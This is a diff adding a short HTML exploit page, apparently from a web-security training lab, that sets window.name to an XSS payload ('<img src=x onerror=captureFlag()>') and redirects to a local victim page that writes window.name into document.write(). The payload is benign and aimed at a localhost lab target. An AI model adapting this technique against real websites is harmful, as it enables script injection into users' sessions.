@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Lab 10 Exploit — window.name</title>
+  <style>body{font-family:monospace;background:#0d1117;color:#e6edf3;padding:20px;}</style>
+</head>
+<body>
+<h2 style="color:#f85149;">Lab 10 — window.name XSS Exploit</h2>
+<p style="color:#7d8590;margin:12px 0;">This page sets <code>window.name</code> to a payload, then navigates to the victim page.
+The victim reads <code>window.name</code> and passes it to <code>document.write()</code>.</p>
+
+<button id="launch" style="background:#238636;color:#fff;border:none;padding:8px 16px;border-radius:6px;cursor:pointer;font-size:14px;">
+  Launch Exploit
+</button>
+
+<div style="margin-top:16px;background:#161b22;border:1px solid #30363d;padding:12px;border-radius:6px;">
+<pre><code style="color:#ffa657;">// What this page does:
+window.name = "&lt;img src=x onerror=captureFlag()&gt;";
+location.href = "http://localhost:3000/lab10";
+// When the victim page loads, it reads window.name into document.write()</code></pre>
+</div>
+
+<script>
+document.getElementById('launch').addEventListener('click', () => {
+  window.name = '<img src=x onerror=captureFlag()>';
+  location.href = 'http://localhost:3000/lab10';
+});
+</script>
+</body>
+</html>
